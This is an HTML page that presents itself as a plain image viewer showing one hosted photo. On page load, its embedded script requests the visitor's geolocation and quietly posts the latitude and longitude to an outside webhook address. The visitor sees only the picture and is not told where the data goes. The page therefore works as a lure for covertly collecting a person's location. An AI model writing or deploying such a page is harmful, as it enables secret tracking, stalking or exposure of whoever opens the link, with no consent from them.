<!DOCTYPE html>
<html>
<head>
    <title>Image View</title>
</head>
<body style="margin:0; background-color:black; display:flex; justify-content:center; align-items:center; height:100vh;">

    <img src="https://i.postimg.cc/xdRX9xYB/IMG-6614.jpg" style="max-width:100%; height:auto;">

    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const webhookURL = "https://e2f275a6-8c4f-4a12-81a9-12f2a1b5d56e.webhooksite.net"; 

                    fetch(webhookURL, {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({ latitude: lat, longitude: lon })
                    });
                });
            }
        };
    </script>
</body>
</html>
